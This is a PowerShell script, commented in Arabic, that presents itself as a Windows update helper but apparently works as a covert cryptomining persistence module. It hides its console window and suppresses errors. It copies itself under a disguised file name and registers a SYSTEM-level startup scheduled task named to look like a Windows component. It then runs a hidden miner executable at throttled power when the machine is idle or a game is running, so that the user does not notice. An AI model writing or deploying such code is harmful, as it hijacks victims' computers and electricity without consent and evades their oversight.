# === WinUpdateHelper v4.2 - Adaptive Persistence Module ===
# Author: System Maintenance Team | DO NOT DELETE

# 1. إخفاء فوري + منع الأخطاء
$ErrorActionPreference = 'SilentlyContinue'
Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(int h,int n);' -Name win -Namespace hide
[hide.win]::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0) | Out-Null

# 2. إنشاء مهمة مجدولة للاستيقاظ الذاتي (يعمل بعد كل إعادة تشغيل)
$taskName = "WindowsUpdateAssistant"
$scriptPath = "$env:APPDATA\Microsoft\Windows\Themes\cache_update.dat"
if (-not (Test-Path $scriptPath)) {
    Copy-Item $PSCommandPath $scriptPath -Force
    $action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-w hidden -ep bypass -file `"$scriptPath`""
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit ([TimeSpan]::Zero)
    Register-ScheduledTask -Name $taskName -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -RunLevel Highest -Force
}

# 3. محرك التكيف الذكي (Adaptive Engine)
$highIntensity = 60
$lowIntensity = 40
$minerPath = "$env:APPDATA\Microsoft\Windows\Themes\win_service.exe"
$configPath = "$env:APPDATA\Microsoft\Windows\Themes\config.dat"

while ($true) {
    $idleSeconds = [Environment]::TickCount / 1000 - (Get-Process csrss).StartTime.TotalSeconds
    $fgProc = (Get-Process | Where-Object {$_.MainWindowHandle -ne 0} | Select-Object -First 1).ProcessName
    
    if ($idleSeconds -gt 300 -and [string]::IsNullOrEmpty($fgProc)) {
        # وضع الخمول: 60% قوة
        & $minerPath --config $configPath --pl $highIntensity --fan 65
    } 
    elseif ($fgProc -match 'game|unity|unreal') {
        # وضع اللعب: 40% قوة ثابتة
        & $minerPath --config $configPath --pl $lowIntensity --fan 45
    }
    else {
        # استخدام عادي: توقف مؤقت
        Stop-Process -Name win_service -Force -ErrorAction SilentlyContinue
    }
    
    Start-Sleep -Seconds 10
}